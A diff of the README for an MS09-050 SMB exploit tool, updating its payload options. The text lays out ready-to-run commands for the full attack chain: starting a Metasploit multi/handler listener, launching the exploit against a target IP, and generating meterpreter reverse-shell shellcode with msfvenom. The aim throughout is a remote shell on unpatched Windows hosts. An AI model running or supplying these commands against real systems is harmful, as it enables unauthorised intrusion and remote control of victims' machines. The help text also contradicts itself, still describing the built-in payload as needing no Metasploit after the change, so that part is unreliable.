@@ -23,9 +23,9 @@ Microsoft patched this in October 2009 (KB975517). Any unpatched Vista SP1/SP2 o
 
 - **Scanner module**: fingerprints target OS and architecture via SMB negotiation, reports vulnerability status
 - **Auto-detect architecture**: scanner feeds arch info directly into the exploit, no manual guessing
-- **Built-in payloads**: standalone reverse TCP shell for x86 and x64, no Metasploit required
-- **msfvenom integration**: optional shellcode generation via msfvenom when available
-- **Custom shellcode support**: load any raw shellcode file
+- **Built-in payload**: meterpreter/reverse_tcp stager for x86, ready to use with multi/handler
+- **msfvenom integration**: generate any payload for any arch via msfvenom, with optional `--msf-payload` to choose a custom payload
+- **Custom shellcode support**: load any raw shellcode file (`-s`)
 - **Structured output**: `[+]` success, `[-]` error, `[!]` warning, `[*]` info
 
 ## Installation
@@ -68,34 +68,36 @@ Output:
 [+] Target appears VULNERABLE to MS09-050
 ```
 
-### Exploit with built-in payload (recommended)
+### Exploit with built-in payload (x86)
 
-Auto-detect architecture:
+Uses a meterpreter/reverse_tcp stager. Start your handler first:
+
+```bash
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.0.0.5; set LPORT 4444; run"
+```
+
+Then run the exploit:
 ```bash
 python3 MS09.py exploit -t 192.168.1.10 --payload -l 10.0.0.5 -p 4444
 ```
 
-Specify architecture manually:
+### Exploit with msfvenom (any arch/payload)
+
 ```bash
-python3 MS09.py exploit -t 192.168.1.10 --payload -l 10.0.0.5 -p 4444 -a x64
+python3 MS09.py exploit -t 192.168.1.10 --msfvenom -l 10.0.0.5 -p 4444 -a x64
 ```
 
-Before running, start your listener:
-```bash
-nc -lvnp 4444
-```
-
-### Exploit with msfvenom shellcode
+### Exploit with msfvenom (custom payload)
 
 ```bash
-python3 MS09.py exploit -t 192.168.1.10 --msfvenom -l 10.0.0.5 -p 4444 -a x86
+python3 MS09.py exploit -t 192.168.1.10 --msfvenom --msf-payload windows/meterpreter/reverse_tcp -l 10.0.0.5 -p 4444
 ```
 
 ### Exploit with custom shellcode file
 
-Generate raw shellcode with any tool:
+Generate raw shellcode once, reuse without msfvenom:
 ```bash
-msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 EXITFUNC=thread -f raw -o shellcode.bin
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 EXITFUNC=thread -f raw -o shell.bin
 ```
 
 Then feed it to the exploit:
@@ -121,17 +123,18 @@ $ python3 MS09.py exploit -h
 
 usage: MS09.py exploit [-h] -t TARGET [-P PORT] [-a {x86,x64}]
                         (--payload | --msfvenom | -s FILE)
-                        [-l LHOST] [-p LPORT]
+                        [-l LHOST] [-p LPORT] [--msf-payload PAYLOAD]
 
 options:
-  -t, --target    Target IP address
-  -P, --port      SMB port (default: 445)
-  -a, --arch      Target architecture (auto-detected if omitted)
-  --payload       Use built-in reverse shell payload (no Metasploit needed)
-  --msfvenom      Generate shellcode with msfvenom
-  -s, --shellcode Path to raw shellcode file
-  -l, --lhost     Listener IP address
-  -p, --lport     Listener port
+  -t, --target      Target IP address
+  -P, --port        SMB port (default: 445)
+  -a, --arch        Target architecture (auto-detected if omitted)
+  --payload         Use built-in reverse shell payload (no Metasploit needed)
+  --msfvenom        Generate shellcode with msfvenom
+  --msf-payload     msfvenom payload (default: shell_reverse_tcp x86, x64/shell_reverse_tcp x64)
+  -s, --shellcode   Path to raw shellcode file
+  -l, --lhost       Listener IP address
+  -p, --lport       Listener port
 ```
 
 ## Project Structure
